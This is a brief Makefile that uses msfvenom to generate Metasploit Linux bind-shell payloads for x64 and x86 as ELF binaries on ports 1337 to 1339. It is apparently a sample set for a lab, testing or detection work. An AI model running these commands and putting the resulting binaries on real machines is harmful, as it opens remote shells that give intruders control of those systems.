MSFVENOM := msfvenom

PORTS := 1337 1338 1339

TARGETS_X64 := $(patsubst %, X64/metasploit_bind_tcp_%, $(PORTS))
TARGETS_X86 := $(patsubst %, X86/metasploit_bind_tcp_%, $(PORTS))

ALL_TARGETS := $(TARGETS_X64) $(TARGETS_X86)

all: $(ALL_TARGETS)

X64/metasploit_bind_tcp_%: PAYLOAD = linux/x64/shell/bind_tcp 
X86/metasploit_bind_tcp_%: PAYLOAD = linux/x86/shell/bind_tcp

metasploit_bind_tcp_%:
	$(MSFVENOM) -p $(PAYLOAD) LPORT=$(*F) AppendExit=true --format elf --out $@

clean:
	rm -f $(ALL_TARGETS)
